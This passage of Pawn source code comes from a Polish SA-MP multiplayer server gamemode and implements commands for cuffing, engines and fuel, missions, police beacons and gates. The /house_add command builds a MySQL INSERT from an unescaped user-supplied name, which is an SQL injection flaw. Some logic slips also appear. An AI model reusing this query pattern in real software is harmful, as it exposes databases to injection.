			return BrakTeam(playerid,COMPANY_POLICJA);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/skuj [id]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		new Float:xx,Float:yy,Float:zz;
		GetPlayerPos(id,xx,yy,zz);


		if(GetPlayerVehicleID(id) != GetPlayerVehicleID(playerid))
			return SendClientMessage(playerid,Zielony,"# Nie jestes gracza w pojezdzie lub on nie jest na piechote!");

		if(!IsPlayerInRangeOfPoint(playerid,6.0,xx,yy,zz))
			return SendClientMessage(playerid,Zielony,"# Musisz byc blisko gracza!");

		if(GetPVarInt(id,"skuty") != 1)
		{
			SetPlayerSpecialAction(id, 24);
			TogglePlayerControllable(id, 0);
			SendClientMessage(id,Zielony,"# Zostales skuty! Nie mozesz sie poruszac!");
			SetPVarInt(id,"skutyprzez",playerid);
			SetPVarInt(id,"skuty",1);
		}
		else
		{
			TogglePlayerControllable(id, 1);
			SetPlayerSpecialAction(id, 0);
			SendClientMessage(id,Zielony,"# Zostales odkuty!");
			SetPVarInt(playerid,"skutyprzez",1337);
			SetPVarInt(id,"skuty",0);
		}

		return 1;
	}
	//Odpalanie silnika
	CMD:on(playerid, params[])
	{

		if(!IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, Szary, "Nie siedzisz w pojezdzie");
			return 1;
		}
		if(2 != GetPlayerState(playerid))
		{
			SendClientMessage(playerid, Szary, "Nie jestes kierowca");
			return 1;
		}
		new vehid = GetPlayerVehicleID(playerid);
		new engine, lights, alarm, doors, bonnet, boot, objective;
		if(vehid != 0 && GetPlayerState(playerid) == 2 && VehicleInfo[vehid][Paliwo] > 0)
			if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
		{

			new modelt = GetVehicleTrailer(vehid);
			new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);


			if(vehid != 0 && VehicleInfo[dllt][Towar] >= 1 && IsTrailerAttachedToVehicle(vehid))
			{


				if(GetVehicleParamsEx(vehid, engine, lights, alarm, doors, bonnet, boot, objective))
				{


					if(engine == 1 && VehicleInfo[dllt][Towar] >= 1 && paused[playerid] == false)
					{

						new Float:predx, Float:predy, Float:predz,predb;
						GetVehicleVelocity(vehid,predx,predy,predz);
						predb = floatround(floatsqroot(floatpower(predx, 2) + floatpower(predy, 2) + floatpower(predz, 2)) * 169);

						if(predb >= 1 && predb <= 10)
						{
							VehicleInfo[dllt][KM] += 0.0001;
						}
						if(predb >= 11 && predb <= 20)
						{
							VehicleInfo[dllt][KM] += 0.0008;
						}
						if(predb >= 21 && predb <= 30)
						{
							VehicleInfo[dllt][KM] += 0.0015;
						}
						if(predb >= 31 && predb <= 40)
						{
							VehicleInfo[dllt][KM] += 0.0020;
						}
						if(predb >= 41 && predb <= 50)
						{
							VehicleInfo[dllt][KM] += 0.0026;
						}
						if(predb >= 51 && predb <= 60)
						{
							VehicleInfo[dllt][KM] += 0.0030;
						}
						if(predb >= 61 && predb <= 70)
						{
							VehicleInfo[dllt][KM] += 0.0034;
						}
						if(predb >= 71 && predb <= 80)
						{
							VehicleInfo[dllt][KM] += 0.0039;
						}
						if(predb >= 81 && predb <= 90)
						{
							VehicleInfo[dllt][KM] += 0.0043;
						}
						if(predb >= 91 && predb <= 100)
						{
							VehicleInfo[dllt][KM] += 0.0048;
						}
						if(predb >= 101 && predb <= 110)
						{
							VehicleInfo[dllt][KM] += 0.0064;
						}
						if(predb >= 111 && predb <= 120)
						{
							VehicleInfo[dllt][KM] += 0.0078;
						}
						if(predb >= 121 && predb <= 130)
						{
							VehicleInfo[dllt][KM] += 0.0087;
						}
						if(predb >= 131 && predb <= 140)
						{
							VehicleInfo[dllt][KM] += 0.0094;
						}
						if(predb >= 141 && predb <= 150)
						{
							VehicleInfo[dllt][KM] += 0.0100;
						}
						if(predb >= 151 && predb <= 160)
						{
							VehicleInfo[dllt][KM] += 0.0109;
						}
						if(predb >= 161)
						{
							VehicleInfo[dllt][KM] += 0.0115;
						}

						new query[150];
						new towar = VehicleInfo[dllt][Towar];
						format(query,sizeof query,"~r~%s - %0.2f km",cInfo[towar][namet],VehicleInfo[dllt][KM]);
						TextDrawSetString(towartd[playerid],query);
						TextDrawShowForPlayer(playerid,towartd[playerid]);

					}
					else
					{




					}
				}
			}
			else
			{
				TextDrawHideForPlayer(playerid,towartd[playerid]);

			}



			if(engine == 1)
			{
				SetVehicleParamsEx(vehid,0,0,0,0,0,0,0);

			}
			else
			{
				new query[150];

				new paliwstatus[50];

				if(VehicleInfo[vehid][Paliwo] >= 300)
				{
					format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
				}

				if(VehicleInfo[vehid][Paliwo] >= 250 && VehicleInfo[vehid][Paliwo] <= 299)
				{
					format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
				}

				if(VehicleInfo[vehid][Paliwo] >= 200 && VehicleInfo[vehid][Paliwo] <= 249)
				{
					format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
				}

				if(VehicleInfo[vehid][Paliwo] >= 150 && VehicleInfo[vehid][Paliwo] <= 199)
				{
					format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
				}

				if(VehicleInfo[vehid][Paliwo] >= 100 && VehicleInfo[vehid][Paliwo] <= 149)
				{
					format(paliwstatus,sizeof paliwstatus,"~w~%d L",VehicleInfo[vehid][Paliwo]);
				}

				if(VehicleInfo[vehid][Paliwo] >= 1 && VehicleInfo[vehid][Paliwo] <= 99)
				{
					format(paliwstatus,sizeof paliwstatus,"~r~%d ~y~[R]",VehicleInfo[vehid][Paliwo]);
				}

				if(VehicleInfo[vehid][Paliwo] <= 0)
				{
					GameTextForPlayer(playerid, "Koniec paliwa!",8000,5);
					SetVehicleParamsEx(vehid, 0,0,0,0,0,0,0);
				}
				format(query,sizeof query,"~r~Paliwo: %s",paliwstatus);
				TextDrawSetString(paliwotd[playerid],query);

				SetVehicleParamsEx(vehid, 1,1,0,0,0,0,0);
			}
		}
		return 1;
	}


	//zw i jj
	CMD:zw(playerid, params[])

	{

		new pname[24];

		GetPlayerName(playerid, pname, sizeof(pname));

		new pid[128];

		format(pid, sizeof(pid), "(Info) Gracz %s (id: %d) zaraz wraca.", pname, playerid);
		SendClientMessageToAll(Szary,pid);


		TogglePlayerControllable(playerid, 0);

		GetPlayerHealth(playerid, ZyciePrzedZW[playerid]);
		GraczWpisalZW[playerid]=1;

		return 1;

	}

	CMD:jj(playerid, params[])

	{

		new pname[24];

		GetPlayerName(playerid, pname, sizeof(pname));

		new pid[128];
		if(GraczWpisalZW[playerid]==0) return SendClientMessage(playerid, -1, "Nie mozesz teraz wpisac? /jj.");
		format(pid, sizeof(pid), "(Info) Gracz %s (id: %d) juz wrocil.", pname, playerid);
		SendClientMessageToAll(Szary,pid);


		TogglePlayerControllable(playerid, 1);

		SetPlayerHealth(playerid, ZyciePrzedZW[playerid]);

		return 1;

	}
	//Kolczatka

	CMD:kogut(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != COMPANY_POLICJA && PlayerInfo[playerid][Team] != COMPANY_POGOTOWIE)
			return SendClientMessage(playerid,Szary,"Brak odpowiednich uprawnien!");

		new vehid = GetPlayerVehicleID(playerid);

		if(vehid != 0)
		{
			if(GetPVarInt(playerid,"kogut") == 1)
			{
				DestroyObject(kogut[vehid]);
				DestroyObject(kogut2[vehid]);
				return SetPVarInt(playerid,"kogut",0);
			}
			else
			{

				new m = GetVehicleModel(vehid);
				/*
				// Police-Sultan:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.525000,0.000000,0.899999,0.000000,0.000000,0.000000);

				// InfernusPolice:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.525000,0.000000,0.899999,0.000000,0.000000,0.000000);

				// InfernusPolice:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.375000,0.000000,0.750000,0.000000,0.000000,0.000000);

				// Buffallo-Police:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.525000,0.000000,0.899999,0.000000,0.000000,0.000000);

				// Buffallo-Police:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.375000,0.000000,0.750000,0.000000,0.000000,0.000000);

				// Buffallo-Police:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.375000,0.000000,0.674999,0.000000,0.000000,0.000000);

				// NRG-Police:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.525000,0.000000,0.899999,0.000000,0.000000,0.000000);

				// NRG-Police:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.375000,0.000000,0.750000,0.000000,0.000000,0.000000);

				// NRG-Police:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), -0.375000,0.000000,0.674999,0.000000,0.000000,0.000000);

				// NRG-Police:
				new myobject = CreateObject(18646,0,0,-1000,0,0,0,100);
				AttachObjectToVehicle(myobject, GetPlayerVehicleID(playerid), 0.000000,-0.974999,0.674999,0.000000,0.000000,0.000000);

				*/
				if(m == 522)
				{
					kogut[vehid] = CreateObject(18646,0,0,-1000,0,0,0,100);
					AttachObjectToVehicle(kogut[vehid], GetPlayerVehicleID(playerid), 0.000000,-0.974999,0.674999,0.000000,0.000000,0.000000);
					SetPVarInt(playerid,"kogut",1);
				}
				if(m == 541)
				{
					kogut[vehid] = CreateObject(18646,0,0,-1000,0,0,0,100);
					AttachObjectToVehicle(kogut[vehid], GetPlayerVehicleID(playerid), -0.375000,0.000000,0.674999,0.000000,0.000000,0.000000); SetPVarInt(playerid,"kogut",1);
				}
				if(m == 411)
				{
					kogut[vehid] = CreateObject(18646,0,0,-1000,0,0,0,100);
					AttachObjectToVehicle(kogut[vehid], GetPlayerVehicleID(playerid), -0.375000,0.000000,0.750000,0.000000,0.000000,0.000000); SetPVarInt(playerid,"kogut",1);
				}
				if(m == 560)
				{
					kogut[vehid] = CreateObject(18646,0,0,-1000,0,0,0,100);
					AttachObjectToVehicle(kogut[vehid], GetPlayerVehicleID(playerid), -0.525000,0.000000,0.899999,0.000000,0.000000,0.000000); SetPVarInt(playerid,"kogut",1);
				}

				if(m == 500)
				{

					// Police Messa 500:
					kogut[vehid] = CreateObject(18646,0,0,-1000,0,0,0,100);
					AttachObjectToVehicle(kogut[vehid], GetPlayerVehicleID(playerid), -0.750000,0.375000,0.899999,0.000000,0.000000,0.000000);

					// Super  18688 -500:
					kogut2[vehid] = CreateObject(18688,0,0,-1000,0,0,0,100);
					AttachObjectToVehicle(kogut2[vehid], GetPlayerVehicleID(playerid), 0.449999,-2.250000,-2.025000,0.000000,0.000000,0.000000);

				}

			}
		}


		return 1;
	}
	CMD:house_add(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new name[100],price;
		if(sscanf(params,"ds[100]",price,name))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/house_add [price] [name]");

		new string[150];
		new Float:xg,Float:yg,Float:zg;
		GetPlayerPos(playerid,xg,yg,zg);

		LoadedInfo[Houses]++;
		new id = LoadedInfo[Houses];
		HouseInfo[id][xh] = xg;
		HouseInfo[id][yh] = yg;
		HouseInfo[id][zh] = zg;
		HouseInfo[id][Name] = name;

		new buffer[200];

		format(buffer,sizeof buffer,"SELECT `id` FROM `houses` ORDER BY `id` DESC LIMIT 1");
		mysql_query(buffer);
		mysql_store_result();
		mysql_fetch_row(buffer,"|");
		sscanf(buffer,"p<|>d",HouseInfo[id][UIDh]);
		mysql_free_result();

		format(string,sizeof string,"Ulica: "BIALYHEX"%s {009e05} - %d",HouseInfo[id][Name],HouseInfo[id][UIDh]);
		Create3DTextLabel(string, 0x009e05FF,HouseInfo[id][xh],HouseInfo[id][yh],HouseInfo[id][zh], 100.0, 0, 0);

		format(buffer,sizeof buffer,"INSERT INTO `houses`(`name`, `x`, `y`, `z`, `owner`, `sell`, `price`, `spawn`) VALUES ('%s','%f','%f','%f','Brak','1','%d','0')",name,xg,yg,zg,price);
		mysql_query(buffer);

		return 1;
	}
	CMD:misja(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != COMPANY_LINIA && PlayerInfo[playerid][Team] != COMPANY_POGOTOWIE && PlayerInfo[playerid][Team] != COMPANY_PD)
			return SendClientMessage(playerid,Czerwony,"# Nie jestes w TAXI, POGOTOWIU lub w POMOCY DROGOWEJ!");
		new vehid = GetPlayerVehicleID(playerid);


		if(GetVehicleModel(vehid) == 416 || GetVehicleModel(vehid) == 420 || GetVehicleModel(vehid) == 438 || GetVehicleModel(vehid) == 525 || GetVehicleModel(vehid) == 552 || GetVehicleModel(vehid) == 494)
		{

			if(GetPVarInt(playerid,"misja") == 1)
				return SendClientMessage(playerid,Czerwony,"Wykonujesz juz misje!");


			if(vehid == 0)
				return SendClientMessage(playerid,Czerwony,"Musisz byc w wozie!");



			if(PlayerInfo[playerid][Team] == COMPANY_LINIA)
			{
				dance:
				new domy = LoadedInfo[Houses];
				new r = random(domy);


				if(r == 0)
					goto dance;


				MisjaInfo[playerid][xm] = HouseInfo[r][xh];
				MisjaInfo[playerid][ym] = HouseInfo[r][yh];
				MisjaInfo[playerid][zm] = HouseInfo[r][zh];

				new string[150];
				format(string,sizeof string,"# Misja: Wsiadl do ciebie klient ktory chce jechac do: "BIALYHEX"%s",HouseInfo[r][Name]);
				SendClientMessage(playerid,Zielony,string);
				SendClientMessage(playerid,Zielony,"# Gdy bedziesz na miejscu wpisz "BIALYHEX"/misja_ok");


				SetPlayerMapIcon(playerid, 4, MisjaInfo[playerid][xm], MisjaInfo[playerid][ym],MisjaInfo[playerid][zm], 19, 0, MAPICON_GLOBAL );
				SetPVarInt(playerid,"misja",1);

			}

			if(PlayerInfo[playerid][Team] == COMPANY_POGOTOWIE)
			{
				dance:
				new domy = LoadedInfo[Houses];
				new r = random(domy);



				if(r == 0)
					goto dance;


				new string[150];
				format(string,sizeof string,"# Misja: Musisz uleczyc gracza ktory jest w: "BIALYHEX"%s",HouseInfo[r][Name]);
				SendClientMessage(playerid,Zielony,string);
				SendClientMessage(playerid,Zielony,"# Gdy bedziesz na miejscu wpisz "BIALYHEX"/misja_ok");
				MisjaInfo[playerid][xm] = HouseInfo[r][xh];
				MisjaInfo[playerid][ym] = HouseInfo[r][yh];
				MisjaInfo[playerid][zm] = HouseInfo[r][zh];

				SetPlayerMapIcon(playerid, 4, MisjaInfo[playerid][xm], MisjaInfo[playerid][ym],MisjaInfo[playerid][zm], 22, 0, MAPICON_GLOBAL );
				SetPVarInt(playerid,"misja",1);
			}

			if(PlayerInfo[playerid][Team] == COMPANY_PD)
			{	
				dance:
				new domy = LoadedInfo[Houses];
				new r = random(domy);



				if(r == 0)
					goto dance;


				new string[150];
				format(string,sizeof string,"# Misja: Samochod nie chce mi zapalic! Jestem w garazu przy ulicy "BIALYHEX"%s",HouseInfo[r][Name]);
				SendClientMessage(playerid,Zielony,string);
				SendClientMessage(playerid,Zielony,"# Gdy bedziesz na miejscu wpisz "BIALYHEX"/misja_ok");
				MisjaInfo[playerid][xm] = HouseInfo[r][xh];
				MisjaInfo[playerid][ym] = HouseInfo[r][yh];
				MisjaInfo[playerid][zm] = HouseInfo[r][zh];

				SetPlayerMapIcon(playerid, 4, MisjaInfo[playerid][xm], MisjaInfo[playerid][ym],MisjaInfo[playerid][zm], 22, 0, MAPICON_GLOBAL );
				SetPVarInt(playerid,"misja",1);
			}

		}
		else
		{

			SendClientMessage(playerid, Szary, "# Nie jestes w odpowiednim pojezdzie!");

		}


		return 1;
	}
	CMD:misja_ok(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != COMPANY_LINIA && PlayerInfo[playerid][Team] != COMPANY_POGOTOWIE && PlayerInfo[playerid][Team] != COMPANY_PD)
			return SendClientMessage(playerid,Czerwony,"# Nie jestes w TAXI lub POGOTOWIU!");

		if(GetPVarInt(playerid,"misja") != 1)
			return SendClientMessage(playerid,Zielony,"# Nie wykonujesz misji!");

		if(!IsPlayerInRangeOfPoint(playerid,15.0,MisjaInfo[playerid][xm],MisjaInfo[playerid][ym],MisjaInfo[playerid][zm]))
			return SendClientMessage(playerid,Zielony,"# Nie jestes na miejscu!");
		new vehid = GetPlayerVehicleID(playerid);
		if(GetVehicleModel(vehid) == 416 || GetVehicleModel(vehid) == 420 || GetVehicleModel(vehid) == 438 || GetVehicleModel(vehid) == 525 || GetVehicleModel(vehid) == 552 || GetVehicleModel(vehid) == 494)
		{


			if(vehid == 0)
				return SendClientMessage(playerid,Zielony,"# Musisz byc w wozie!");

			if(PlayerInfo[playerid][Team] == COMPANY_PD)
			{
				if(BonusCargo == true)
				{
				SendClientMessage(playerid,Zielony,"# HappyWorld bonus: "BIALYHEX"$"HW_MONEY_TEXT" "ZIELONYHEX"i"BIALYHEX" "HW_SCORE_TEXT" score");
				GiveMoneyEx(playerid,HW_MONEY);
				GiveScoreEx(playerid,GetScoreEx(playerid)+HW_SCORE);
				Earned(playerid,HW_MONEY,"Bonus HW misja");
				}

				if(PlayerInfo[playerid][VIP] == 1)
				{
				SendClientMessage(playerid,Zielony,"# Bonus VIP: "BIALYHEX"$200 "ZIELONYHEX"i"BIALYHEX" 5 score");
				GiveMoneyEx(playerid,200);
				GiveScoreEx(playerid,GetScoreEx(playerid)+5);
				Earned(playerid,200,"Bonus VIP misja");
				}

				SetPVarInt(playerid,"misja",0);
				SendClientMessage(playerid,Zolty,"# Wykonales misje! Wynagrodzenie: "BIALYHEX"$350 i 5 score");
				GiveMoneyEx(playerid,350);
				GiveScoreEx(playerid,GetScoreEx(playerid)+5);
				Earned(playerid,350,"Wykonanie misji");

				RemovePlayerMapIcon(playerid,4);
			}
			else
			{


			if(BonusCargo == true)
			{
			SendClientMessage(playerid,Zielony,"# HappyWorld bonus: "BIALYHEX"$"HW_MONEY_TEXT" "ZIELONYHEX"i"BIALYHEX" "HW_SCORE_TEXT" score");
			GiveMoneyEx(playerid,HW_MONEY);
			GiveScoreEx(playerid,GetScoreEx(playerid)+HW_SCORE);
			Earned(playerid,HW_MONEY,"Bonus HW misja");
			}

			if(PlayerInfo[playerid][VIP] == 1)
			{
			SendClientMessage(playerid,Zielony,"# Bonus VIP: "BIALYHEX"$200 "ZIELONYHEX"i"BIALYHEX" 5 score");
			GiveMoneyEx(playerid,200);
			GiveScoreEx(playerid,GetScoreEx(playerid)+5);
			Earned(playerid,200,"Bonus VIP misja");
			}

			SetPVarInt(playerid,"misja",0);
			SendClientMessage(playerid,Zolty,"# Wykonales misje! Wynagrodzenie: "BIALYHEX"$500 i 10 score");
			GiveMoneyEx(playerid,500);
			GiveScoreEx(playerid,GetScoreEx(playerid)+10);
			Earned(playerid,500,"Wykonanie misji");

			RemovePlayerMapIcon(playerid,4);
			}
		}
		else
		{

			SendClientMessage(playerid, Szary, "# Nie jestes w odpowiednim pojezdzie!");

		}
		return 1;
	}




	forward bramaclosetax();
	public bramaclosetax()
	{
		MoveObject(bramataxi, 349.1000100,-1786.0000000,7.1000000,1.0);
		return 1;
	}
	forward bramaclosemc();
	public bramaclosemc()
	{
		return MoveObject(bramamc, 1948.3000000,2404.8000000,12.6000000,1.0);
	}
	forward bramaclosepd();
	public bramaclosepd()
	{

		return MoveObject(bramapd, -128.1000100,-179.3999900,3.7000000,1.0);
	}
	forward bramacloserico();
	public bramacloserico()
	{
		MoveObject(bramarico1, -1528.4000000,483.2000100,9.1000000,1);
		MoveObject(bramarico2, -72.5000000,-133.5000000,4.9000000,256.0000000,1);
		return 1;
	}
	// -2594.3999000,1355.6999500,8.8000000,0.0000000,0.0000000,44.0000000 ET
	forward bramacloseet();
	public bramacloseet()
	{
		return MoveObject(bramaet, -2864.3999000,469.7000100,6.6000000,1.0);
	}
	forward bramaclosepoli();
	public bramaclosepoli()
	{
		return MoveObject(bramapoli, 1527.0000000,665.2000100,12.4000000,1.0);
	}
	forward bramaclosevip();
	public bramaclosevip()
	{
		return MoveObject(bramavip, 2167.6001000,984.2999900,12.600000,1.0);
	}
	forward bramkadolvclose();
	public bramkadolvclose()
	{
		return MoveObject(bramkadolv, 1729.7000000,464.3999900,29.4000000,1.0);
	}
	forward bramkadolsclose();
	public bramkadolsclose()
	{
		return MoveObject(bramkadols, 1710.9000000,479.2999900,29.2000000,1.0);
	}
	forward bramacloseosiedle();
	public bramacloseosiedle()
	{
		return MoveObject(osiedle, -1172.3000000,-988.4000200,131.1000100,1.0);
	}
	forward bramaclosebazaadm();
	public bramaclosebazaadm()
	{
		return MoveObject(bazaadm, 1523.4000000,2773.2000000,12.4000000,1.0);
	}
	forward bramaclosete();
	public bramaclosete()
	{
		return MoveObject(bramate, 2827.1001000,1381.1000000,12.5000000,1.0);
	}
	forward bramaclosecruzz();
	public bramaclosecruzz()
	{
		return MoveObject(bramacruzz, 1002.5000000,-644.0999800,122.7000000,1.0);
	}
	forward bramaclosepks();
	public bramaclosepks()
	{
		return MoveObject(bramapks, 1397.4000000,2694.3000000,12.6000000,1.0);
	}
	forward bramaclosepenl();
	public bramaclosepenl()
	{
		MoveObject(bramapenl, 197.89999, -316.79999, 0.9,4);
		MoveObject(bramapenl2, 83.59961, -221, 3.3, -2.66600,4);
		return 1;
	}
	CMD:brama(playerid,params[])
	{



		/*
		bramataxi = CreateObject(980, 2155.1675,1835.6168,12.8203,0.0,0.0,61.7532);
		bramataxi2 = CreateObject(980, 2162.8877,1849.5260,12.8203,0.0,0.0,242.2115);
		bramarico1 = CreateObject(980,14.849010,110.897285,4.841268,0.299999,0.000000,55.600006);
		bramarico2 = CreateObject(980,-71.662902,-133.680328,4.839396,0.000000,0.000000,77.500015);
		bramamc = CreateObject(980,1140.298583,-1293.142456,15.293938,0.000000,0.000000,0.000000);

		//CreateObject(980,15.2000000,110.7000000,4.9000000,0.0000000,0.0000000,56.0000000); //object(airportgate) (1)
		//CreateObject(980,-72.5000000,-133.5000000,4.9000000,0.0000000,0.0000000,256.0000000); //object(airportgate) (2)

		*/

		if(PlayerInfo[playerid][Team] == COMPANY_TAXI)
		{
			MoveObject(bramataxi, 349.1000100,-1786.0000000,13.1000000,4);
			SetTimer("bramaclosetax",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		if(PlayerInfo[playerid][Team] == COMPANY_POGOTOWIE)
		{
			MoveObject(bramamc, 1935.6000000,2405.0000000,12.6000000,4);
			SetTimer("bramaclosemc",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		/*if(PlayerInfo[playerid][Team] == 6)
		{
			MoveObject(bramarico1, -1516.7000000,484.2000100,9.1000000,4);
			MoveObject(bramarico2, -72.5000000,-133.5000000,-15.9000000,256.0000000,4);
			SetTimer("bramacloserico",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}*/
		if(PlayerInfo[playerid][Team] == 2)
		{
			/*bramaet = CreateObject(980,-2594.3999000,1355.6999500,8.8000000,0.0000000,0.0000000,44.0000000); //object(airportgate) (1) ET
			bramapd = CreateObject(980,1066.5999800,1358.0999800,12.5000000,0.0000000,0.0000000,0.0000000); //object(airportgate) (2) PD*/

			MoveObject(bramapd, -128.1000100,-179.3999900,-13.7000000,4);
			SetTimer("bramaclosepd",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		if(PlayerInfo[playerid][Team] == 5)
		{
			MoveObject(bramaet, -2864.3999000,469.7000100,-10.6000000,4);
			SetTimer("bramacloseet",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		if(PlayerInfo[playerid][Team] == COMPANY_POLICJA)
		{
			/*
		bramapoli = CreateObject(980,1527.0000000,665.2000100,12.4000000,0.0000000,0.0000000,0.0000000);
		bramapoli2 = CreateObject(980,1447.4000000,664.5000000,12.4000000,0.0000000,0.0000000,0.0000000);
			*/
			MoveObject(bramapoli,1527.0000000,665.2000100,-12.40000000,4);
			SetTimer("bramaclosepoli",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		if(PlayerInfo[playerid][Team] == 6)
		{
			MoveObject(bramate, 2827.1001000,1381.1000000,-12.5000000,4);
			SetTimer("bramaclosete",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		if(PlayerInfo[playerid][Team] == 10)
		{
			MoveObject(bramapks, 1398.4000000,2680.8999000,12.6000000,4);
			SetTimer("bramaclosepks",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}

		if(PlayerInfo[playerid][Team] == 7)
		{
			MoveObject(bramapenl, 197.58960, -315.93170, -2.66600,4);
			MoveObject(bramapenl2, 83.59960, -221.00000, -2.20000,4);
			SetTimer("bramaclosepenl",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}

		return 1;
	}
	CMD:brama2(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] == COMPANY_POLICJA)
		{
			/*
		bramapoli = CreateObject(980,1527.0000000,665.2000100,12.4000000,0.0000000,0.0000000,0.0000000);
		bramapoli2 = CreateObject(980,1447.4000000,664.5000000,12.4000000,0.0000000,0.0000000,0.0000000);
			*/
			MoveObject(bramapoli2,1447.4000000,664.5000000,-12.4000000,4);
			SetTimer("bramaclosepoli2",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		return 1;
	}


	forward bramaclosepoli2();
	public bramaclosepoli2()
	{
		return MoveObject(bramapoli2, 1447.4000000,664.5000000,12.4000000,1.0);
	}

	CMD:open_lot(playerid,params[])
	{
		/*		bramalotnisko1 = CreateObject(971,87.0000000,-199.0000000,6.4000000,0.0000000,0.0000000,1.5000000);
		bramalotnisko2 = CreateObject(980,-45.2998000,-138.4003900,5.4000000,0.0000000,0.0000000,261.9960000);*/

		if(PlayerInfo[playerid][Team] == 7 || PlayerInfo[playerid][Team] == 5)
		{
			MoveObject(bramalotnisko1,87.0000000,-199.0000000,-10.4000000,4);
			MoveObject(bramalotnisko2,-45.2998000,-138.4003900,-10.4000000,4);
			SetTimer("bramacloselotnisko",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		return 1;
	}	
	forward bramacloselotnisko();
	public bramacloselotnisko()
	{
		MoveObject(bramalotnisko1, 87.0000000,-199.0000000,6.4000000,4);
		MoveObject(bramalotnisko2, -45.2998000,-138.4003900,5.4000000,4);
		return 1;
	}
	CMD:openvip(playerid,params[])
	{
		if(PlayerInfo[playerid][VIP] != 1)
			return SendClientMessage(playerid,Zielony,"# Aby otworzyc baze potrzebujesz konta VIP");
		{
			MoveObject(bramavip,2167.6001000,984.2999900,19.1000000,4);
			SetTimer("bramaclosevip",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		return 1;
	}
	//granica lv-ls, ls-lv
	CMD:lv(playerid,params[])
	{
		GiveMoneyEx(playerid,-0);
		{
			MoveObject(bramkadolv,1729.7000000,464.3999900,25.9000000,4);
			SetTimer("bramkadolvclose",5000,false);
			SendClientMessage(playerid,Zielony,"Witaj w Las Venturas || Koszt przejazdu: "BIALYHEX"Darmowy");
		}
		return 1;
	}
	CMD:ls(playerid,params[])
	{
		GiveMoneyEx(playerid,-0);
		{
			MoveObject(bramkadols,1710.9000000,479.2999900,26.0000000,4);
			SetTimer("bramkadolsclose",5000,false);
			SendClientMessage(playerid,Zielony,"Witaj w Los Santos || Koszt przejazdu: "BIALYHEX"Darmowy");
		}
		return 1;
	}
	CMD:osiedle(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 5)
			return BrakAdmina(playerid,6);
		{
			MoveObject(osiedle,-1173.1000000,-976.2000100,131.1000100,4);
			SetTimer("bramacloseosiedle",5000,false);
			SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		return 1;
	}
	CMD:ba(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 1)
			return BrakAdmina(playerid,2);
		{
			MoveObject(bazaadm,1524.0000000,2761.5000000,12.4000000,4);
			SetTimer("bramaclosebazaadm",5000,false);
			SendClientMessage(playerid,Zielony,"Brama zostala otwarta i zamknie sie za 5 sekund!");
		}
		return 1;
	}
	CMD:polna12(playerid,params[])
	{
		MoveObject(bramacruzz,1012.9000000,-639.4000200,122.7000000,4);
		SetTimer("bramaclosecruzz",5000,false);
		SendClientMessage(playerid,Zielony,"# Brama zostala otwarta i zamknie sie za 5 sekund!");

		return 1;
	}
